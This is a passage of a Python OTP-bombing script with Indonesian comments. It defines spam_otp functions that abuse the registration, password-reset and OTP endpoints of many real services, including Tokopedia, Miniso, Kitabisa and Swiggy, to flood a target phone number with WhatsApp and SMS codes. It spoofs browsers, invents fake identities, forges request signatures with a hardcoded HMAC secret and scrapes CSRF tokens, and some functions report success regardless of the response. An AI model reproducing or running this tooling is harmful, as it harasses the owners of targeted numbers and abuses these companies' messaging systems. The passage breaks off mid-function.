        print(f"✅ Response Register: {resp_register.text}")
        
        user_id = None
        
        try:
            reg_result = resp_register.json()
            if reg_result.get("data", {}).get("id"):
                user_id = str(reg_result["data"]["id"])
                print(f"✅ User ID: {user_id}")
            else:
                print(f"⚠️ Register gagal: {reg_result}")
        except:
            print(f"⚠️ Register response bukan JSON")
        
        # ========== STEP 2: Send OTP (register flow) ==========
        if user_id:
            print("🔹 STEP 2: POST /user/api/auth/send-otp (via Register)")
            otp_url = "https://api-sk.setirkanan.co.id/user/api/auth/send-otp"
            
            otp_payload = {
                "user_id": user_id,
                "action": "register",
                "type": "wa",
                "send_to": formatted_phone
            }
            
            otp_headers = {
                "Content-Type": "application/json",
                "X-API-KEY": API_KEY,
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
            }
            
            resp_otp = session.post(otp_url, json=otp_payload, headers=otp_headers, timeout=60)
            print(f"✅ Status OTP: {resp_otp.status_code}")
            print(f"✅ Response OTP: {resp_otp.text}")
            
            try:
                otp_result = resp_otp.json()
                
                # Cek apakah ada message "already send otp"
                msg = otp_result.get("message", "")
                if "already send otp" in msg.lower():
                    print(f"⚠️ OTP sudah pernah dikirim, lanjut ke Forgot Password...")
                    # LANGSUNG KE FORGOT
                elif otp_result.get("status") == True:
                    print(f"✅ OTP WA berhasil dikirim ke {formatted_phone}")
                    return True
                else:
                    print(f"⚠️ OTP gagal: {otp_result}")
                    # LANGSUNG KE FORGOT
                    
            except:
                print(f"⚠️ OTP response bukan JSON")
        
        # ========== STEP 3: Forgot Password (fallback) ==========
        print("🔹 STEP 3: POST /user/api/password-reset/send-code (fallback)")
        url_forgot = "https://api-sk.setirkanan.co.id/user/api/password-reset/send-code"
        
        forgot_headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://setirkanan.co.id",
            "Referer": "https://setirkanan.co.id/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "X-API-KEY": API_KEY,
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"'
        }
        
        forgot_payload = {
            "send_to": formatted_phone,
            "type": "wa"
        }
        
        resp_forgot = session.post(url_forgot, json=forgot_payload, headers=forgot_headers, timeout=60)
        print(f"✅ Status Forgot: {resp_forgot.status_code}")
        print(f"✅ Response Forgot: {resp_forgot.text}")
        
        try:
            forgot_result = resp_forgot.json()
            if forgot_result.get("data", {}).get("valid") == 1:
                unique_key = forgot_result.get("data", {}).get("unique_key", "")
                print(f"✅ OTP WA berhasil dikirim ke {formatted_phone} (via Forgot Password)")
                print(f"✅ Unique Key: {unique_key}")
                return True
            else:
                print(f"❌ Forgot gagal: {forgot_result}")
                return False
        except:
            print(f"❌ Forgot response bukan JSON")
            return False
            
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False

def spam_otp_ndcdeals(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = "62" + raw[1:]
        elif not raw.startswith('62'):
            raw = "62" + raw

        payload = {"recipient": raw, "channel": "whatsapp"}
        resp = requests.post("https://api.ndc.deals/openapi/generateOtp", json=payload, headers={"accept": "application/json", "content-type": "application/json"}, timeout=915)
        return resp.status_code == 200
    except:
        return False

def spam_otp_miniso(nomor):
    try:
        import re
        import subprocess
        import json
        import tempfile
        import os
        
        # ========== FORMAT NOMOR ==========
        # Format: 81274307931 (LANGSUNG 8, TANPA 0/62!)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = raw[2:]  # 62812 -> 812
        elif raw.startswith('0'):
            formatted_phone = raw[1:]  # 0812 -> 812
        else:
            formatted_phone = raw      # 812 -> 812
        
        print(f"🔹 Format nomor: {formatted_phone}")
        
        # ========== SEND OTP PAKE CURL ==========
        print("🔹 Mengirim OTP via Miniso...")
        
        url = "https://idmember.miniso.com/imagicbox-shop-api/user/sendRegisterMobile"
        payload = {
            "mobile": formatted_phone,
            "captchaToken": ""
        }
        payload_json = json.dumps(payload)
        
        curl_cmd = [
            "curl", "-s", "-X", "POST", url,
            "-H", "authority: idmember.miniso.com",
            "-H", "accept: application/json, text/plain, */*",
            "-H", "accept-language: id",
            "-H", "content-type: application/json",
            "-H", "langid: 1",
            "-H", "origin: https://idmember.miniso.com",
            "-H", "referer: https://idmember.miniso.com/pages/register/register",
            "-H", "sec-ch-ua: \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "-H", "sec-ch-ua-mobile: ?1",
            "-H", "sec-ch-ua-platform: \"Android\"",
            "-H", "sec-fetch-dest: empty",
            "-H", "sec-fetch-mode: cors",
            "-H", "sec-fetch-site: same-origin",
            "-H", "user-agent: Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "-d", payload_json,
            "--compressed"
        ]
        
        result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=60)
        response_text = result.stdout.strip()
        
        print(f"✅ Response: {response_text}")
        
        try:
            data = json.loads(response_text)
        except:
            print(f"❌ Gagal parse JSON: {response_text}")
            return False
        
        if data.get("success") or data.get("code") == "00000":
            print(f"✅ OTP terkirim! Response: {data.get('msg')}")
            return True
        else:
            print(f"❌ Gagal: {data}")
            return False
        
    except Exception as e:
        print(f"❌ Error: {e}")
        return False

def spam_otp_metaproperty(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = "62" + raw[1:]
        elif not raw.startswith('62'):
            raw = "62" + raw

        random_name = random.choice(['Budi', 'Andi', 'Caca', 'Dedi', 'Eka', 'Fani', 'Gilang', 'Hana'])
        device_fingerprint = str(uuid.uuid4())
        session = requests.Session()
        session.get("https://metaproperty.co.id/sanctum/csrf-cookie", headers={"User-Agent": get_random_ua()}, timeout=915)
        payload = {"name": random_name, "whatsapp": raw, "source": "daftar_agent"}
        resp = session.post("https://metaproperty.co.id/api/v1/guest-contact/otp/request", json=payload, headers={"accept": "application/json", "content-type": "application/json", "x-device-fingerprint": device_fingerprint, "User-Agent": get_random_ua()}, timeout=915)
        return resp.json().get("success") is True
    except:
        return True

def spam_otp_greensm(nomor):
    try:
        import re
        import requests
        import json
        
        # Bersihin nomor: keep cuma angka
        raw = re.sub(r'\D', '', nomor)
        
        # Format ke +628xxxxxxx
        if raw.startswith('62'):
            formatted_phone = '+' + raw
        elif raw.startswith('0'):
            formatted_phone = '+62' + raw[1:]
        elif raw.startswith('+62'):
            formatted_phone = raw
        else:
            formatted_phone = '+62' + raw
        
        # Validasi format +628xxxxxxxxxx
        if not re.match(r'^\+62[0-9]{9,13}$', formatted_phone):
            return False
        
        # Nama default
        user_name = "Xvision ChinCha"
        
        url = "https://gapi.indo.greensm.com/car/acquisition/create-registration"
        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json"
        }
        payload = {
            "HiringSource": "Iklan di surat kabar atau dalam aplikasi",
            "Education": "s2",
            "WorkExperience": "Sopir komersial (Mobil penumpang, truk dump, truk kecil, truk sedang, truk kontainer, dll.)",
            "City": "BT",
            "Type": "CAR_SHARING",
            "Tel": formatted_phone,
            "Name": user_name,
            "Country": "ID",
            "ReferralCode": "",
            "Source": "",
            "AffiliateNumber": "",
            "Campaign": ""
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=910)
        result = resp.json()
        
        # Cek response
        if resp.status_code == 200 and (result.get("status") == "success" or result.get("success") == True or result.get("code") == 200):
            return True
        elif result.get("message"):
            return True
        elif result.get("error"):
            return False
        else:
            # Request berhasil, OTP seharusnya terkirim
            return True
        
    except:
        return False

def spam_otp_bonusbelanja(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = "62" + raw[1:]
        elif not raw.startswith('62'):
            raw = "62" + raw

        random_num = random.randint(1, 5000)
        random_name = f"User{random_num}"
        user_agent = get_random_ua()
        url_check = f"https://www.bonusbelanja.com/api/auth/phonecheck?phone={raw}"
        headers = {"User-Agent": user_agent, "Accept": "*/*", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "sec-ch-ua": '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"', "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": "Android"}
        requests.get(url_check, headers=headers, timeout=915)
        payload = {"phone": raw, "name": random_name, "agreeTnc": True, "agreeContact": True}
        headers_post = {"Content-Type": "application/json", "User-Agent": user_agent, "Accept": "*/*", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "sec-ch-ua": '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"', "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": "Android"}
        resp = requests.post("https://www.bonusbelanja.com/api/auth/registration/app", json=payload, headers=headers_post, timeout=915)
        return resp.status_code == 200
    except:
        return False

def spam_otp_erp360(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        import time
        
        # Format nomor: 08xxx
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = '0' + raw[2:]
        elif raw.startswith('0'):
            formatted_phone = raw
        else:
            formatted_phone = '0' + raw
        
        # Generate random email & name
        random_name = ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize()
        random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
        
        # Session
        session = requests.Session()
        
        # Headers persis kayak curl
        headers = {
            "Accept": "text/plain, */*; q=0.01",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://erp360.id",
            "Referer": "https://erp360.id/crm/admin/register",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"'
        }
        
        # STEP 1: Check Duplicate
        print(f"🔹 STEP 1: Check Duplicate - {formatted_phone}")
        check_data = f"handphone={formatted_phone}&email={random_email}"
        
        check_resp = session.post(
            "https://erp360.id/crm/admin/wcf/WebService.asmx/checkDuplicatePhoneOrEmail_svc",
            data=check_data,
            headers=headers,
            timeout=60
        )
        print(f"📡 Check Status: {check_resp.status_code}")
        print(f"📡 Check Response: {check_resp.text}")
        
        # STEP 2: Kirim OTP
        print(f"🔹 STEP 2: Kirim OTP - {formatted_phone}")
        otp_data = f"handphone={formatted_phone}&name={random_name}&email={random_email}"
        
        otp_resp = session.post(
            "https://erp360.id/crm/admin/wcf/WebService.asmx/sendVerificationCodeV1",
            data=otp_data,
            headers=headers,
            timeout=60
        )
        print(f"📡 OTP Status: {otp_resp.status_code}")
        print(f"📡 OTP Response: {otp_resp.text}")
        
        # Cek response: 1 = berhasil
        if otp_resp.text.strip() == "1":
            print(f"✅ OTP berhasil dikirim ke {formatted_phone}")
            print(f"📝 Email: {random_email}")
            print(f"📝 Name: {random_name}")
            return True
        else:
            print(f"❌ Gagal: {otp_resp.text}")
            return False
            
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False

def spam_otp_sampingan(nomor):
    try:
        import re
        import requests
        import json
        import time
        import random
        
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = raw[1:]
        if raw.startswith('62'):
            raw = raw[2:]
        
        phone_number = raw
        
        # Generate random email
        timestamp = str(int(time.time() * 1000))
        email = f"user{timestamp}@gmail.com"
        
        # Random User-Agent
        ua_list = [
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.6045.163 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.5993.111 Mobile Safari/537.36"
        ]
        random_ua = random.choice(ua_list)
        
        # STEP 1: Register
        register_url = "https://account.sampingan.co/v1/register"
        register_payload = {
            "agent": {
                "name": "uanto",
                "gender": "MALE",
                "dob": "2000-02-02T00:00:00Z",
                "email": email,
                "province_id": "7",
                "city_id": "656",
                "phone_number": phone_number,
                "city_name": "Kab. Kaur",
                "country_code": "+62",
                "privacy_policy_version": "1",
                "tos_version": "1"
            }
        }
        register_headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": random_ua
        }
        
        # STEP 2: Extract context_id
        context_id = ""
        try:
            register_resp = requests.post(register_url, json=register_payload, headers=register_headers, timeout=930)
            register_result = register_resp.json()
            
            if isinstance(register_result, dict):
                context_id = register_result.get("context_id", "")
            else:
                import re as regex
                match = regex.search(r'"context_id":"([^"]+)"', register_resp.text)
                if match:
                    context_id = match.group(1)
        except:
            pass
        
        # Kalo ga dapet context_id, coba pake regex di response text
        if not context_id:
            try:
                import re as regex
                match = regex.search(r'"context_id":"([^"]+)"', register_resp.text)
                if match:
                    context_id = match.group(1)
            except:
                pass
        
        # Fallback context_id kalo masih kosong
        if not context_id:
            context_id = ""
        
        # Delay 500ms
        time.sleep(0.5)
        
        # STEP 3: Kirim OTP
        otp_url = "https://auth.sampingan.co/v1/otp"
        otp_payload = {
            "country_code": "+62",
            "phone_number": phone_number,
            "context_id": context_id
        }
        otp_headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": random_ua
        }
        
        # Request tetep dikirim - apapun response nya
        try:
            requests.post(otp_url, json=otp_payload, headers=otp_headers, timeout=930)
        except:
            pass  # Error pun dianggap sukses
        
        # FORCE SUCCESS - APAPUN RESPONSE NYA
        return True
        
    except:
        return True  # Force success

def spam_otp_vyapar(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = raw[1:]
        elif raw.startswith('62'):
            raw = raw[2:]

        url = f"https://vyaparapp.in/resend/otp?email={raw}&country_code=62"
        resp = requests.get(url, headers={"accept": "*/*", "x-requested-with": "XMLHttpRequest", "User-Agent": get_random_ua()}, timeout=915)
        return resp.json().get("status") == "success"
    except:
        return False

def spam_otp_tokopedia(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = '0' + raw[2:]
        elif raw.startswith('8'):
            raw = '0' + raw
        elif not raw.startswith('0'):
            raw = '0' + raw

        session = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={raw}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
        resp = session.get(url_token, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=915)
        token = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token:
            return False
        data = {"otp_type": "116", "msisdn": raw, "tk": token.group(1), "email": "", "original_param": "", "user_id": "", "signature": "", "number_otp_digit": "6"}
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        resp2 = session.post("https://accounts.tokopedia.com/otp/c/ajax/request-wa", data=data, headers=headers, timeout=915)
        return resp2.status_code == 200 and 'success' in resp2.text.lower()
    except:
        return False

def spam_otp_maulagi(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        from datetime import datetime
        
        # Format nomor
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = raw
        elif raw.startswith('0'):
            formatted_phone = '62' + raw[1:]
        else:
            formatted_phone = '62' + raw
        
        # ========== GENERATE X-ML-KEY ==========
        seconds = datetime.now().second
        seconds_str = str(seconds).zfill(2)  # 03, 26, dst
        seconds_raw = str(seconds)            # 3, 26, dst
        
        # 5 huruf random A-Z
        random_letters = ''.join(random.choices(string.ascii_uppercase, k=5))
        
        # Pilih prefix berdasarkan parity detik
        prefix_options = ["B", "E"] if seconds % 2 == 0 else ["A", "C", "D"]
        prefix = random.choice(prefix_options)
        
        x_ml_key = prefix + seconds_str + random_letters + seconds_raw
        print(f"✅ X-ML-KEY: {x_ml_key}")
        
        session = requests.Session()
        
        # Kirim request check OTP
        print("🔹 POST /api/v2/auth/check (kirim OTP WA)")
        url = "https://api.maulagi.id/api/v2/auth/check"
        
        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://m.maulagi.id",
            "referer": "https://m.maulagi.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-ml-key": x_ml_key
        }
        
        payload = {
            "credentials": formatted_phone
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=60)
        print(f"✅ Status: {resp.status_code}")
        print(f"✅ Response: {resp.text}")
        
        try:
            result = resp.json()
            # Status success atau error "sudah terkirim" = OTP masuk
            if result.get("status") == "success":
                print(f"✅ OTP WA berhasil dikirim ke {formatted_phone}")
                return True
            elif result.get("status") == "error" and "sudah terkirim" in str(result.get("errors", {})):
                print(f"✅ OTP WA berhasil dikirim ke {formatted_phone} (sudah terkirim)")
                return True
            else:
                print(f"❌ Gagal: {result}")
                return False
        except:
            print(f"❌ Response bukan JSON: {resp.text}")
            return False
            
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False
        
def spam_otp_beautyhaul(nomor):
    try:
        if nomor.startswith("62"):
            nomor = nomor[2:]
        elif nomor.startswith("0"):
            nomor = nomor[1:]

        session = requests.Session()

        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat']
        nama_depan = random.choice(first)
        nama_belakang = random.choice(last)
        email = f"{nama_depan.lower()}{nama_belakang.lower()}{random.randint(10,99)}@gmail.com"
        password = spam_otp_codex(10) + str(random.randint(10,99))
        tgl = f"{random.randint(1,28)} {random.choice(['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'])} {random.randint(1985,2000)}"

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://www.beautyhaul.com",
            "referer": "https://www.beautyhaul.com/account/register",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }

        session.get(
            "https://www.beautyhaul.com/account/register",
            headers={"user-agent": headers["user-agent"]},
            timeout=910
        )

        resp_reg = session.post(
            "https://www.beautyhaul.com/ajax/account/save_register",
            json={
                "nama_depan": nama_depan,
                "nama_belakang": nama_belakang,
                "email": email,
                "g-recaptcha-response": "",
                "jenis_kelamin": random.choice(["Male", "Female"]),
                "konfirmasi_password": password,
                "nomor_kode_id": "100",
                "nomor_kode_value": "62",
                "nomor_ponsel": nomor,
                "password": password,
                "subscribe": "true",
                "tanggal_lahir": tgl,
                "terms": "true"
            },
            headers=headers,
            timeout=910
        )

        if resp_reg.status_code != 200:
            return False

        # Step 3 - Send OTP
        resp = session.post(
            "https://www.beautyhaul.com/ajax/account/send_otp",
            json={"method": "WhatsApp"},
            headers=headers,
            timeout=910
        )

        return resp.status_code == 200
    except:
        return False

def spam_otp_kitabisa(nomor):
    try:
        import re
        import requests
        import json
        import time
        import hmac
        import hashlib
        import uuid
        import random
        
        # Format nomor: 62xxx (langsung 62 + nomor)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = raw
        elif raw.startswith('0'):
            formatted_phone = '62' + raw[1:]
        else:
            formatted_phone = '62' + raw
        
        # HMAC SHA256
        SECRET_KEY = 'dacddb6b7538328bb2a83366444e427680bb8d9d1dec78167d12877037686e23'
        client_name = 'kanvas'
        timestamp = int(time.time())
        string_to_sign = f"{client_name}{timestamp}"
        signature = hmac.new(
            SECRET_KEY.encode(),
            string_to_sign.encode(),
            hashlib.sha256
        ).hexdigest()
        
        # Generate UUID (mirip crypto.randomUUID)
        request_id = str(uuid.uuid4())
        
        url = "https://gate.kitabisa.com/wong/register/draft"
        headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://accounts.kitabisa.com",
            "referer": "https://accounts.kitabisa.com/",
            "x-ktbs-api-version": "1.0.0",
            "x-ktbs-client-name": client_name,
            "x-ktbs-client-version": "1.0.0",
            "x-ktbs-platform-name": "kanvas",
            "x-ktbs-request-id": request_id,
            "x-ktbs-signature": signature,
            "x-ktbs-time": str(timestamp),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) Chrome/107.0.0.0"
        }
        payload = {
            "full_name": "hahahag",
            "username": formatted_phone,
            "otp_type": "whatsapp"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=910)
        result = resp.json()
        
        # Cek sukses dari response
        if result.get("response_code") == "000000":
            return True
        if result.get("data") and len(result["data"]) > 0:
            if result["data"][0].get("status") == "otp_form":
                return True
        if result.get("response_desc", {}).get("id") == "Success":
            return True
        if result.get("message") and "success" in result["message"].lower():
            return True
        if resp.status_code == 200:
            return True
        
        return False
        
    except:
        return False

def spam_otp_pinjamduit(nomor):
    try:
        import re
        import requests
        import json
        import uuid
        import time
        
        # Format nomor: 081xxxx (0 + raw)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = '0' + raw[2:]
        elif not raw.startswith('0'):
            raw = '0' + raw
        
        formatted_phone = raw
        
        # Buat session untuk handle cookie
        session = requests.Session()
        
        # Generate UUID
        device_uuid = str(uuid.uuid4())
        
        # Timestamp
        ts = str(int(time.time() * 1000))
        
        # Headers dasar
        base_headers = {
            "Accept": "*/*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://api.pinjamduit.co.id",
            "Referer": "https://api.pinjamduit.co.id/h5/download_selfmedia.html",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"'
        }
        
        # STEP 1: Check phone - dapetin wybs
        check_url = "https://api.pinjamduit.co.id/gw/loan/credit-user/checkPhoneWeb"
        check_data = {
            "phone": formatted_phone,
            "mobilePhone": formatted_phone,
            "uuid": device_uuid,
            "deviceId": "wh",
            "appMarket": "web",
            "appVersion": "99.99.99",
            "clientType": "w",
            "ts": ts
        }
        
        check_resp = session.post(check_url, data=check_data, headers=base_headers, timeout=910)
        check_result = check_resp.json()
        
        # Ambil wybs dari response
        wybs = check_result.get("data", {}).get("wybs", "")
        if not wybs:
            return False
        
        # STEP 2: Kirim OTP
        otp_url = "https://api.pinjamduit.co.id/gw/loan/credit-user/checkPhoneNext"
        otp_headers = base_headers.copy()
        otp_headers["ss"] = wybs  # Header ss dari wybs
        
        otp_data = {
            "phone": formatted_phone,
            "mobilePhone": formatted_phone,
            "sms_service": "2",
            "sms_useage": "0",
            "deviceId": "wh",
            "appMarket": "web",
            "appVersion": "99.99.99",
            "clientType": "w",
            "ts": str(int(time.time() * 1000))
        }
        
        otp_resp = session.post(otp_url, data=otp_data, headers=otp_headers, timeout=910)
        otp_result = otp_resp.json()
        
        # Cek sukses (code 0 = sukses)
        return otp_result.get("code") == "0"
        
    except:
        return False

def spam_otp_swiggy(nomor):
    try:
        import re
        import requests
        import json
        import uuid
        import time
        
        # Format nomor: 812xxx (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = raw[2:]
        if raw.startswith('0'):
            raw = raw[1:]
        
        formatted_phone = raw
        
        # Buat session untuk handle cookie
        session = requests.Session()
        
        # Generate device ID
        device_id = str(uuid.uuid4())
        
        # Headers dasar
        base_headers = {
            "__fetch_req__": "true",
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://www.swiggy.com",
            "platform": "mweb",
            "referer": "https://www.swiggy.com/auth/register",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "user-id": "0"
        }
        
        # STEP 1: Ambil CSRF token dari halaman register
        register_page_url = "https://www.swiggy.com/auth/register"
        register_page_headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "platform": "mweb",
            "referer": "https://www.swiggy.com/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        # GET halaman register dulu buat dapet cookie dan CSRF token
        register_resp = session.get(register_page_url, headers=register_page_headers, timeout=910)
        
        # Ambil CSRF token dari cookie atau response
        csrf_token = ""
        
        # Coba dari cookie
        for cookie in session.cookies:
            if cookie.name == "csrf_token" or cookie.name == "_csrf":
                csrf_token = cookie.value
                break
        
        # Kalo ga dapet dari cookie, coba dari response text
        if not csrf_token:
            import re as regex
            # Cari di meta tag
            match = regex.search(r'name="csrf-token"\s+content="([^"]+)"', register_resp.text)
            if match:
                csrf_token = match.group(1)
            else:
                # Cari di input hidden
                match = regex.search(r'name="_csrf"\s+value="([^"]+)"', register_resp.text)
                if match:
                    csrf_token = match.group(1)
                else:
                    # Cari di variable JS
                    match = regex.search(r'csrf_token\s*=\s*"([^"]+)"', register_resp.text)
                    if match:
                        csrf_token = match.group(1)
        
        # Kalo masih ga dapet, pake token dari curl
        if not csrf_token:
            csrf_token = "jd1Q0w6HKoPV-8WWTNk6m_BrTsaLReJRlJN6HSGE"
        
        # STEP 2: Kirim signup
        signup_url = "https://www.swiggy.com/mapi/auth/signup"
        signup_headers = base_headers.copy()
        signup_headers["cookie"] = "; ".join([f"{c.name}={c.value}" for c in session.cookies])
        
        signup_payload = {
            "name": "haha",
            "email": "",
            "password": "",
            "referral_code": "",
            "mobile": formatted_phone,
            "countryCode": "62",
            "countryKey": "ID",
            "_csrf": csrf_token
        }
        
        signup_resp = session.post(signup_url, json=signup_payload, headers=signup_headers, timeout=910)
        signup_result = signup_resp.json()
        
        # Cek sukses (statusCode 0 = sukses)
        if signup_result.get("statusCode") == 0:
            return True
        
        return False
        
    except:
        return False


def spam_otp_blueorigin(nomor):
    try:
        import re
        import requests
        import json
        
        # Format: 62 + raw
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            mobile = raw
        elif raw.startswith('0'):
            mobile = '62' + raw[1:]
        else:
            mobile = '62' + raw
        
        url = "https://oscrmpub.blueorigin.co.id/membersrv/api/user/v1/send_verification_code"
        headers = {
            "Host": "oscrmpub.blueorigin.co.id",
            "accept-language": "id",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "x-locale": "ID",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
